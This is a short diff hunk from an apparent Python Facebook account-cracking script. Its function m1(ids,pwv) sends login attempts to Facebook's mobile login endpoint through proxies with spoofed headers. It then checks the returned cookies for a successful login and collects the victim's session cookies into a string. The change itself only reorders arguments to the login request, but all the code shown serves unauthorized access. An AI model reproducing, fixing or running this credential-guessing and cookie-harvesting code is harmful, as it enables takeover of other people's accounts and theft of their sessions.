@@ -842,7 +842,7 @@ def m1(ids,pwv):
             'Referer': 'https://m.facebook.com/login.php?next=https%3A%2F%2Fmbasic.facebook.com%2F&refsrc=deprecated&_rdr',
             'Accept-Encoding': 'gzip, deflate, br',
             'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8'}
-            session.post(f'https://{fb}.facebook.com/login/device-based/regular/login/?',data=info, proxies=proxies,headers=update,allow_redirects=False).text
+            session.post(f'https://{fb}.facebook.com/login/device-based/regular/login/?',data=info,headers=update,proxies=proxies,allow_redirects=False).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                 kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
